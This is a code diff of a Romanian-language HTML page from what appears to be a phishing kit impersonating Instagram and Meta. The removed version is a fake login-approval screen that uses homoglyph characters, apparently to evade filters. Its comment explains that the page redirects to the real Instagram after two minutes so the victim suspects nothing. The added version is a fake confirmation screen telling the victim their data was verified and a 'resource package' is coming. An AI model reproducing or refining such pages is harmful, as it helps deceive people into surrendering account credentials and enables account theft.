@@ -3,27 +3,45 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Confirmare</title>
+    <title>Solicitare Trimisă</title>
     <style>
-        body { background: white; font-family: -apple-system, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; padding: 25px; }
-        .device-icon { width: 80px; margin-bottom: 20px; }
-        h2 { font-size: 20px; color: #262626; margin-bottom: 10px; }
-        p { font-size: 14px; color: #8e8e8e; line-height: 1.5; margin-bottom: 30px; }
-        .loader { border: 2px solid #dbdbdb; border-top: 2px solid #0095f6; border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite; margin: 20px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .footer { position: absolute; bottom: 20px; font-size: 11px; color: #c7c7c7; text-transform: uppercase; }
+        body { background: #ffffff; font-family: -apple-system, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .box { width: 320px; padding: 50px 20px; text-align: center; border-radius: 24px; box-shadow: 0 20px 40px rgba(0,0,0,0.08); border: 1px solid #f2f2f2; }
+        
+        /* Iconița cu bifa de succes pe gradientul tău */
+        .success-icon { 
+            width: 80px; height: 80px; 
+            background: linear-gradient(45deg, #0095f6, #ff007f); 
+            border-radius: 50%; 
+            margin: 0 auto 30px; 
+            display: flex; align-items: center; justify-content: center;
+            box-shadow: 0 8px 20px rgba(0, 149, 246, 0.2);
+        }
+
+        .check-svg { width: 40px; height: 40px; fill: white; }
+
+        h2 { font-size: 22px; color: #262626; margin-bottom: 12px; font-weight: 700; }
+        p { font-size: 14px; color: #8e8e8e; line-height: 1.5; padding: 0 10px; margin-bottom: 30px; }
+        
+        .timer { font-size: 12px; color: #b0b0b0; font-style: italic; }
+        
+        .btn-home { display: inline-block; text-decoration: none; background: #f2f2f2; color: #262626; padding: 12px 25px; border-radius: 10px; font-weight: 600; font-size: 14px; margin-top: 10px; transition: 0.3s; }
+        .btn-home:hover { background: #e8e8e8; }
     </style>
 </head>
 <body>
-    <img src="https://img.icons8.com/ios/100/0095f6/multiple-devices.png" class="device-icon">
-    <h2>Verifică nοtificările</h2>
-    <p>Am trimis o cerere de aprοbare pe dispοzitivele tale. <br> Deschide aplicația și apasă pe <b>"Da, eu sunt"</b> pentru a confirma logarea.</p>
-    <div class="loader"></div>
-    <p style="font-size: 12px; color: #a8a8a8;">Se așteaptă confirmarea...</p>
-    <div class="footer">from META</div>
-    <script>
-        // O trimite la site-ul real dupa 2 minute ca sa nu suspecteze nimic
-        setTimeout(function(){ window.location.href = "https://www.instagram.com/"; }, 120000);
-    </script>
+    <div class="box">
+        <div class="success-icon">
+            <svg class="check-svg" viewBox="0 0 24 24">
+                <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
+            </svg>
+        </div>
+        <h2>Solicitare Înregistrată!</h2>
+        <p>Datele tale au fost verificate cu succes. Pachetul de resurse va fi activat pe profilul tău în maximum 24 de ore.</p>
+        
+        <div class="timer">Poți închide această fereastră.</div>
+        <br>
+        <a href="https://instagram.com" class="btn-home">Înapoi la aplicație</a>
+    </div>
 </body>
 </html>
